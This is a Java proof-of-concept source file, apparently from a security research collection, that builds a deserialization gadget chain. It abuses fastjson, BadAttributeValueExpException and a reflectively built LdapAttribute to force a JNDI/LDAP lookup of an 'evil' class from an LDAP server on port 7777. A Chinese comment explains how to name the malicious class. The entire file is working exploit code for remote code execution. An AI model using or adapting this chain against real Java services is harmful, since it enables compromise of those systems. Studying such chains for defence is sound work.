package com.javasec.pocs.fastjson;

import com.alibaba.fastjson.JSONObject;
import com.fasterxml.jackson.databind.node.POJONode;
import com.javasec.utils.SerializeUtils;

import javax.management.BadAttributeValueExpException;
import javax.naming.CompositeName;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
public class BALdapChain {
    public static void main(String[] args) throws Exception {
        String ldapCtxUrl = "ldap://127.0.0.1:7777/";
        Class ldapAttributeClazz = Class.forName("com.sun.jndi.ldap.LdapAttribute");
        Constructor ldapAttributeClazzConstructor = ldapAttributeClazz.getDeclaredConstructor(
                new Class[] {String.class});
        ldapAttributeClazzConstructor.setAccessible(true);
        Object ldapAttribute = ldapAttributeClazzConstructor.newInstance(
                new Object[] {"name"});
        SerializeUtils.setFieldValue(ldapAttribute,"baseCtxURL",ldapCtxUrl);
        //evil为恶意类名字，切记别带包名，否则无法实例化。。。。。。。。。
        SerializeUtils.setFieldValue(ldapAttribute,"rdn",new CompositeName("evil//b"));
        JSONObject jsonObject = new JSONObject();
        jsonObject.put("pop",ldapAttribute);
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Field val = Class.forName("javax.management.BadAttributeValueExpException").getDeclaredField("val");
        val.setAccessible(true);
        val.set(badAttributeValueExpException,jsonObject);
        SerializeUtils.base64deserial(SerializeUtils.base64serial(badAttributeValueExpException));
    }
}
